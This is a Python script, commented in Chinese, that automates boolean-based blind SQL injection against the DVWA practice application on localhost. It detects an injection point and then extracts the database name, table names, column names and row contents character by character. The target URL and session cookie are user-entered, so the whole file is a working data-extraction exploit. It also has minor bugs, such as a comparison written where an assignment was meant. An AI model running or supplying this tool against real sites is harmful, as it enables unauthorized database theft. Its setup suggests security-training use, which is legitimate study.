"""基于盲注爆破数据库中表的内容"""
import requests
import re

# 示例，防止程序报错，进入程序后用户也不可以自定义内容
url, headers = 'http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/', \
    {'Host': f'127.0.0.1',
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0',
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
     'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
     'Referer': f'http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/',
     'Connection': 'close',
     'Cookie': f'security=low; PHPSESSID=17aeefe9lj6p9fk52s97tgbpgn',
     'Upgrade-Insecure-Requests': '1'
     }


# http://127.0.0.1/pikachu-master/vul/sqli/sqli_id.php
#

# url, headers = 'http://127.0.0.1/pikachu-master/vul/sqli/sqli_str.php', \
#     {'Host': f'127.0.0.1',
#      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0',
#      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
#      'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
#      'Referer': f'http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/',
#      'Connection': 'close',
#      'Cookie': f'security=low; PHPSESSID=17aeefe9lj6p9fk52s97tgbpgn',
#      'Upgrade-Insecure-Requests': '1'
#      }

# 输入信息，伪装用户
def get_header():
    print("[INFO] 输入示例：http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/")
    url = input('[INPUT] 输入url: ')
    # ip = re.search('\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}', url).group()  # 使用正则表达式从url中获取ip
    ip = '127.0.0.1'
    print("[INFO] 输入示例：17aeefe9lj6p9fk52s97tgbpgn")
    cookie = input('[INPUT] 输入PHPSESSID: ')
    headers = {
        'Host': f'{ip}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Referer': f'{url}',
        'Connection': 'close',
        'Cookie': f'security=low; PHPSESSID={cookie}',
        'Upgrade-Insecure-Requests': '1'
    }
    return headers, url


# 判断SQL注入是否成功
def judge(text):  # 接收text参数
    try:
        if 'exists' in re.search('User ID.*?database', text).group():  # 判断是否存在userid和database关键词
            return 1
        else:
            return 0
    except:
        return 0


# 检测低风险的SQL注入漏洞
# def low_res(sql,url, headers):
def low_res(sql):
    Id = f'?id={sql}&Submit=Submit#'  # 根据sql构造出一个URL参数id
    # print(url+Id)
    r = requests.get(url + Id, headers=headers).text  # 使用requests库向服务器发送HTTP GET请求
    # print(r)
    return judge(r)  # 返回judge判断


# 执行注入
def sql_injection(headers, url):
    print('[+] 判断是否存在注入点')
    print("[INFO] 注入语句: 1' and '1'='1 , 1' and '1'='2")
    if low_res("1' and '1'='1") != low_res("1' and '1'='2"):
        print('[*] 此处存在注入点,并且注入类型为字符型')
    elif low_res("1 and 1=1") != low_res("1 and 1=2"):
        print('[*] 此处存在注入点,并且注入类型为数字型')
    else:
        print('[-] 不存在注入')
        quit()
    print('[end]')

    print('[+] 猜测数据库名长度')
    print("[INFO] 注入语句: 1' and length(database())=1# ")
    for i in range(10):
        sql = f"1%27+and+length(database())%3D{i}%23"
        if low_res(sql) == 1:
            databasename_num = i
            break
    print(f'[*] 数据库名称长度为: {databasename_num}')
    print('[end]')

    print('[+] 获取数据库名称')
    print("[INFO] 注入语句: 1' and ascii(substr(database(),1,1))>97# ")
    database_name = ''
    for i in range(databasename_num):
        for j in range(65, 123):
            sql = f"1'+and+ascii(substr(database()%2C{i + 1}%2C1))%3D{j}%23"
            if low_res(sql) == 1:
                database_name += chr(j)
                break
    print(f'[*] 数据库名称为:{database_name}\n[end]')

    print('[+] 猜测表数量')
    print(
        "[INFO] 注入语句: 1' and (select count(table_name) from information_schema.tables where table_schema='[database_name]')=1# ")
    for i in range(9999):
        sql = f"1'+and+(select+count(table_name)+from+information_schema.tables+where+table_schema%3D'{database_name}')%3D{i}%23"
        if low_res(sql) == 1:
            print(f'[*] 该库中有{i}张表\n[end]')
            table_num = i
            break

    print('[+] 猜测库中所有的表长度')
    print(
        "[INFO] 注入语句: 1' and length(substr((select table_name from information_schema.tables where table_schema=[database_name] limit 0,1),1))=9#")
    table_lenth = []
    for i in range(table_num):
        for j in range(9999):
            sql = f"1'+and+length(substr((select+table_name+from+information_schema.tables+where+table_schema%3D'{database_name}'+limit+{i}%2C1)%2C1))%3D{j}%23"
            if low_res(sql) == 1:
                table_lenth.append(j)
                break
    print(f'[*] 该库中的表长度为:', end='')
    list(map(lambda i: print(i, end='  '), [i for i in table_lenth]))
    print('\n[end]')

    table_name = ''
    table_name_list = []
    print('[+] 获取所有的表名')
    print(
        "[INFO] 注入语句: 1' and length(substr((select table_name from information_schema.tables where table_schema=[database_name] limit 0,1),1))=9#")

    for i in range(len(table_lenth)):
        for j in range(table_lenth[i]):
            for g in range(65, 123):
                sql = f"1'+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3D'{database_name}'+limit+{i}%2C1)%2C{j + 1}))={g}%23"
                if low_res(sql) == 1:
                    table_name += chr(g)
                    print(chr(g), end='')
                    break
        table_name_list.append(table_name)
        table_name = ''
        print('')
    print(f'[*] 该库中的表名为:', end='')
    list(map(lambda i: print(i, end='  '), [i for i in table_name_list]))
    print('\n[end]')

    print('[+] 猜测表中列数')
    print(
        "[INFO] 注入语句: 1' and (select count(column_name) from information_schema.columns where table_name=[table_name])=1#")
    list(map(lambda x: print(f'{x[0]}:{x[1]}'), [(x, y) for x, y in enumerate(table_name_list)]))
    table_name = [x for x in table_name_list][int(input('[INPUT] 请选择序号查看表的数据: '))]

    for i in range(9999):
        sql = f"1'+and+(select+count(column_name)+from+information_schema.columns+where+table_name%3D'{table_name}')%3D{i}%23"
        if low_res(sql) == 1:
            print(f'[*] 该表中有{i}列\n[end]')
            lie_num = i
            break

    print('[+] 猜测每一列的长度')
    print(
        "[+] 注入语句: 1' and length(substr((select column_name from information_schema.columns where table_name=[table_name] limit 0,1),1))=1#")

    lie_lenth = []
    for i in range(lie_num):
        for j in range(9999):
            sql = f"1'+and+length(substr((select+column_name+from+information_schema.columns+where+table_name%3D'{table_name}'+limit+{i}%2C1)%2C1))%3D{j}%23"
            if low_res(sql) == 1:
                lie_lenth.append(j)
                break

    # print(lie_lenth)
    print(f'[*] 该表中每列的长度为:', end='')
    list(map(lambda i: print(i, end=' '), [i for i in lie_lenth]))
    print('\n[end]')

    print('[+] 获取每一列的名称')
    print(
        "[INFO] 注入语句: 1' and ascii(substr((select column_name from information_schema.columns where table_name=[table_name] limit 0,1),1))=97#")

    lie_name = ''
    lie_name_list = []
    for i in range(len(lie_lenth)):
        for j in range(lie_lenth[i]):
            for g in range(65, 123):
                sql = f"1'+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D'{table_name}'+limit+{i}%2C1)%2C{j + 1}))%3D{g}%23"
                if low_res(sql) == 1:
                    lie_name += chr(g)
                    print(chr(g), end='')
                    break
        print('')
        lie_name_list.append(lie_name)
        lie_name = ''
    print(f'[*] 该库中的表名为:', end='')
    # print(lie_name_list)
    list(map(lambda i: print(i, end='  '), [i for i in lie_name_list]))
    print('\n[end]')

    print('[+] 获取数据')
    print("[INFO] 注入语句: 1' and (ascii(substr((select [lie_name] from [table_name] limit 0,1),1,1)))=97#")

    data = {}

    for xxx in range(999):
        a = input('[INPUT] 选择表请输入t，输入q返回上一级: ')
        if a == 'q':
            break
        elif a == 't':
            list(map(lambda x: print(f'{x[0]}:{x[1]}'), [(x, y) for x, y in enumerate(lie_name_list)]))
            lie_name = [x for x in lie_name_list][int(input('[INPUT] 请选择序号查看表中数据: '))]
            res = ''
            lst = []
            for i in range(9999):
                for j in range(1, 9999):
                    for g in range(128):
                        NULL = 0
                        ascii = 0
                        sql = f"1'+and+(ascii(substr((select+{lie_name}+from+{table_name}+limit+{i}%2C1)%2C{j}%2C1)))%3D{g}%23"
                        if low_res(sql) == 1:
                            if g == 0:
                                NULL = 1
                                if res == '':
                                    res == 'NULL'
                                break
                            res += chr(g)
                            print(chr(g), end='')
                            break
                    else:
                        ascii = 1
                    if NULL == 1 or ascii == 1:
                        break
                if ascii == 1:
                    break
                lst.append(res)
                res = ''
                print()
            data[lie_name] = lst

    for i in data.keys():
        print(f'\t{i}\t', end='')
    print()
    data_list = list(data.values())
    for i in range(len((data_list)[0])):
        for j in range(len(data_list)):
            print(f'\t{data_list[j][i]}\t', end='')
        print()


# if __name__ == '__main__':
# headers, url = get_header()
# sql_injection(headers, url)


def main():
    headers, url = get_header()
    sql_injection(headers, url)


# if __name__ == '__main__':
#     main()


